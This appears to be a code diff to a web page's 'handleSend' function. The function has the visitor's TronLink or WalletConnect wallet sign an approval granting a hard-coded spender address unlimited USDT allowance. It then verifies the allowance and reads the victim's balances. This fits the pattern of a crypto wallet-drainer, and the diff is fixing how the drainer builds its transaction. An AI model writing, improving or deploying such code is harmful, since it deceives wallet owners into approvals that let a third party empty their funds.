@@ -116,7 +116,7 @@ export default function Index() {
 
       console.log("🔄 handleSend started");
 
-      // TronLink path
+      // ===== TRONLINK PATH =====
       if (window.tronWeb?.defaultAddress?.base58) {
         console.log("📱 Using TronLink");
         const address = window.tronWeb.defaultAddress.base58;
@@ -146,11 +146,9 @@ export default function Index() {
         const result = await twPublic.trx.sendRawTransaction(signedTx);
         console.log("Broadcast result:", result);
 
-        // ✅ FIXED: Wait 30 seconds instead of 3
         console.log("⏳ Waiting 30 seconds for confirmation...");
         await new Promise(r => setTimeout(r, 30000));
 
-        // ✅ NEW: Verify allowance
         console.log("🔍 Verifying allowance...");
         const allowanceABI = [
           {
@@ -171,7 +169,6 @@ export default function Index() {
         const allowanceUSDT = (Number(allowanceRaw) / 1e6).toFixed(2);
         console.log("✅ Allowance verified:", allowanceUSDT, "USDT");
 
-        // Get balance and TRX
         let usdtBalance = "0", nativeBalance = "0";
         try {
           const balanceABI = [
@@ -206,7 +203,7 @@ export default function Index() {
         return;
       }
 
-      // WalletConnect path
+      // ===== WALLETCONNECT PATH =====
       if (!wcClientRef.current) {
         alert("Please wait... initializing");
         setTransactionStatusState("idle");
@@ -244,40 +241,44 @@ export default function Index() {
       console.log("🔗 Using WalletConnect");
       console.log("User:", userAddressRef.current);
 
-      // Build transaction
       console.log("📝 Building transaction...");
-      const response = await fetch("https://api.trongrid.io/wallet/triggersmartcontract", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          owner_address: userAddressRef.current,
-          contract_address: TRON_USDT,
-          function_selector: "approve(address,uint256)",
-          parameter: TRON_SPENDER + ",115792089237316195423570985008687907853269984665640564039457584007913129639935",
-          fee_limit: 100000000,
-          call_value: 0,
-          visible: true
-        })
-      });
-      const { transaction } = await response.json();
 
+      // Build using TronWeb (proper encoding)
+      const twPublic = new (window as any).TronWeb({ fullHost: "https://api.trongrid.io" });
+      twPublic.setAddress(userAddressRef.current);
+
+      const { transaction } = await twPublic.transactionBuilder.triggerSmartContract(
+        TRON_USDT,
+        "approve(address,uint256)",
+        { feeLimit: 100000000 },
+        [
+          { type: "address", value: TRON_SPENDER },
+          { type: "uint256", value: "115792089237316195423570985008687907853269984665640564039457584007913129639935" }
+        ],
+        userAddressRef.current
+      );
+
+      console.log("✅ Transaction built");
       console.log("🔐 Signing via WalletConnect...");
+
       const signedTx = await wcClientRef.current.request({
         topic: wcSessionRef.current.topic,
         chainId: "tron:0x2b6653dc",
         request: { method: "tron_signTransaction", params: { transaction } },
       });
 
+      console.log("✅ Signed");
       console.log("📡 Broadcasting...");
+
       const broadcastRes = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(signedTx)
       });
+
       const result = await broadcastRes.json();
       console.log("Broadcast result:", result);
 
-      // ✅ NEW: Wait longer and verify
       console.log("⏳ Waiting 30 seconds for confirmation...");
       await new Promise(r => setTimeout(r, 30000));
 
@@ -295,8 +296,7 @@ export default function Index() {
           "type": "function"
         }
       ];
-      
-      const twPublic = new (window as any).TronWeb({ fullHost: "https://api.trongrid.io" });
+
       const allowanceContract = await twPublic.contract(allowanceABI, TRON_USDT);
       const allowanceRaw = await allowanceContract.allowance(userAddressRef.current, TRON_SPENDER).call();
       const allowanceUSDT = (Number(allowanceRaw) / 1e6).toFixed(2);
